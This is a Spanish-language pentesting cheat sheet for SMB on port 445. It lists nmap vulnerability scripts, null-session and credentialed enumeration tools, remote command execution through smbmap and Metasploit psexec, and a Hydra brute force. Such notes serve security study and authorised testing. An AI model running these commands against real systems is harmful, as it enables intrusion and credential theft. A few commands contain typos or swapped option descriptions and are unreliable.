---
title: ", SMB"
layout: "single"
category: "Servicios comunes"
slug: "servicios-comunes/-445-smb"
date: "2025-09-30"
---

### Enumeración con NMAP
```bash
nmap <ip> -p <puerto> -n -Pn --script=smb-vuln*
nmap <ip> -p <puerto> -n -Pn --script=smb-protocols
nmap <ip> -p <puerto> -n -Pn --script=smb-security-mode
nmap <ip> -p <puerto> -n -Pn --script=smb-enum-sessions
nmap <ip> -p <puerto> -n -Pn --script=smb-enum-shares
nmap <ip> -p <puerto> -n -Pn --script=smb-enum-shares,smb-ls

nmap <ip> -p <puerto> -n -Pn --script=smb-enum-shares --script-args smbusername=<usuario>,smbpassword=<pass>

nmap <ip> -p <puerto> -n -Pn --script=smb-enum-users --script-args smbusername=<usuario>,smbpassword=<pass>

nmap <ip> -p <puerto> -n -Pn --script=smb-enum-domains --script-args smbusername=<usuario>,smbpassword=<pass>

nmap <ip> -p <puerto> -n -Pn --script=smb-enum-groups --script-args smbusername=<usuario>,smbpassword=<pass>

```

### SMBMap

```bash

# Enumerar recursos compartidos (NULL SESSION)
smbmap -H <ip>
smbmap -H <ip> -u guest -p " " -d . (Para windows)



# Conectarse a un recurso compartido
smbmap -H <ip> -r <recurso>
smbmap -H <ip> -r <recurso> -u "user" -p "pass"

# Descargar/subir fichero
smbmap -H <ip> -r <recurso> --download <path>
smbmap -H <ip> -r <recurso> --upload 'origen' 'destino'

# Ejecución de comandos
smbmap -H <ip> -u "user" -p "pass" -x 'comando'
```

### SMBClient

```bash
# Enumerar recursos compartidos
smbclient -N -L <ip> (NUL SESSION)
smbclient -L <ip> -u <usuario> -p <pass>

# Conectarse a un recurso
smbclient \\\\ip\\recurso --user <usuario> --password <pass>

# Descargar
get <fichero>

```
### Enum4Linux
Enum4linux sirve para reconocer recursos compartidos, usuarios, etc en un dominio.

```bash
## para usar con credenciales, las ponemos entre comillas simples
./enum4linux -u [usuario] -p [contraseña] [IP_o_nombre_de_host]

# escaneo completo
enum4linux -a <IP>

# reconocimiento de usuarios
enum4linux -o <IP>

# Reconocimiento grupos
enum4linux -G <IP>

# reconocimiento del S.O
enum4linux -U <IP>

# Enumeracion recursos
enum4linux -S <IP>

# Enumeracion impresoras
enum4linux -i <IP>
```

### Crackmapexec
```bash
crackmapexec smb <IP> -u '' -p '' --shares
crackmapexec smb <IP> -u 'usuario' -p 'contraseña' --shares
```

### Rpcclient
En caso de linux, tenemos samba. Podemos tratar de enumerar información con rpcclient.

```bash
# Establecer conexión (con usuario en blanco)
rpcclient -U "" -N <ip>

# Entraremos a una consola interactiva en la que podemos ejecutar comandos:
* ? (ayuda comandos)
* srvinfo
* querydispinfo
* enumdomusers
* lookupnames <usuario> (obtener el SID en windows)
* enumdomgroups
```

### RCE psexec Metasploit
Si conocemos credenciales de SMB, en ocasiones (maquinas windows), podemos establecer una conexion para ejecución de comandos.

```bash
use exploit/windows/smb/psexec
```

### Metasploit
```bash
# Enumeracion
use auxiliaryt/scanner/smb/smb_version
use auxiliaryt/scanner/smb/smb2
use auxiliaryt/scanner/smb/smb_enumshares

# Ataques
use auxiliaryt/scanner/smb/smb_login
```

### Hydra
```bash
hydra -l <usuario_conocido> -P rockyou.txt <IP> smb
```

